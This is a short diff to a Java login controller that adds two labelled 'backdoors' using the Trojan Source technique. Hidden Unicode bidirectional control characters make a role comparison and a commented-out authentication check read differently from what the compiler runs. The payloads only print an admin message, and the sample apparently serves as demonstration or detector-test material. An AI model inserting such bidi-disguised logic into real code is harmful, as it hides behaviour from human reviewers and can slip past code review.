@@ -100,7 +100,17 @@ public class LoginController extends Controller {
                     backdooredData
             );
         }
+        
+        // backdoor 5: Source trojan StretchedString
+        if (userEntity.getRole().toString() != "user‮ ⁦// Check if admin⁩ ⁦") {
+            System.out.println("Backdoor5: You are an admin.");
+        }
 
+        // backdoor 6: Source trojan Commenting out
+        /*‮ } ⁦if (userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword()))⁩ ⁦ begin admins only */
+            System.out.println("Backdoor6: You are an admin.");
+        /* end admins only ‮ { ⁦*/
+        
         return new Response<>(response,
                 getHeaders(Constants.CONTENT_TYPE, Constants.APPLICATION_JSON), StatusCode.OK);
     }
